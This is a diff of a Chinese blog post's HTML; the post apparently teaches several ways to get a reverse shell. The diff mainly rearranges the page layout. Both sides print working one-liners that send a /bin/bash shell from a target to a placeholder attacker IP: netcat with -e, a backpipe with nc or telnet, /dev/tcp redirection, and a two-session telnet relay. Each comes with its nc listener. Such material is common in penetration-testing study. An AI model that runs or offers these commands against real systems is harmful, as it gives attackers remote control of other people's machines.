@@ -390,25 +390,25 @@
 <li>下文中的几个例子一般在大多数的系统中是通用的。</li>
 <li>这里主要重点关注一下4和5<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4></li>
 <li>要求能够使用者能够在目标机器上运行一些基本的命令。<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
-<li><p>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）</p>
-<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</div><div class="line">nc -n -vv -l -p &lt;port&gt;					# A</div></pre></td></tr></table></figure>
-</li>
-<li><p>现在的netcat版本可能没有-e参数。</p>
-<h2 id="2-netcat-e被禁用或者没有-e参数"><a href="#2-netcat-e被禁用或者没有-e参数" class="headerlink" title="2.netcat -e被禁用或者没有-e参数"></a>2.netcat -e被禁用或者没有-e参数</h2></li>
-<li>那么可以使用下面的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt;	# A</div></pre></td></tr></table></figure>
-</li>
+<li>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2></li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</div><div class="line">nc -n -vv -l -p &lt;port&gt;					# A</div></pre></td></tr></table></figure>
+<ul>
+<li>现在的netcat版本可能没有-e参数。<h2 id="2-netcat-e被禁用或者没有-e参数"><a href="#2-netcat-e被禁用或者没有-e参数" class="headerlink" title="2.netcat -e被禁用或者没有-e参数"></a>2.netcat -e被禁用或者没有-e参数</h2></li>
+<li>那么可以使用下面的命令</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt;	# A</div></pre></td></tr></table></figure>
 <p><img src="/2018/01/30/reverse-shell的几种方式/2.png" alt=""></p>
 <h2 id="3-不使用netcat"><a href="#3-不使用netcat" class="headerlink" title="3.不使用netcat"></a>3.不使用netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
 <ul>
-<li>这个也是大多数人用的方式，这种方式使用了/dev/tcp套接字的编程特性，重定向/bin/bash到远程系统<h2 id="4-不使用netcat和-dev-tcp"><a href="#4-不使用netcat和-dev-tcp" class="headerlink" title="4.不使用netcat和/dev/tcp"></a>4.不使用netcat和/dev/tcp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
-</li>
+<li>这个也是大多数人用的方式，这种方式使用了/dev/tcp套接字的编程特性，重定向/bin/bash到远程系统<h2 id="4-不使用netcat和-dev-tcp"><a href="#4-不使用netcat和-dev-tcp" class="headerlink" title="4.不使用netcat和/dev/tcp"></a>4.不使用netcat和/dev/tcp</h2></li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
 <p><img src="/2018/01/30/reverse-shell的几种方式/4.png" alt=""></p>
 <ul>
-<li>使用telnet代替nc<h2 id="5-telnet-to-telnet"><a href="#5-telnet-to-telnet" class="headerlink" title="5.telnet to telnet"></a>5.telnet to telnet</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</div><div class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</div><div class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</div></pre></td></tr></table></figure>
-</li>
+<li>使用telnet代替nc<h2 id="5-telnet-to-telnet"><a href="#5-telnet-to-telnet" class="headerlink" title="5.telnet to telnet"></a>5.telnet to telnet</h2></li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</div><div class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</div><div class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</div></pre></td></tr></table></figure>
 <p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p>
 <ul>
 <li>这第五个其实挺有意思的。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-还有什么其它的方法？"><a href="#6-还有什么其它的方法？" class="headerlink" title="6.还有什么其它的方法？"></a>6.还有什么其它的方法？</h2><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
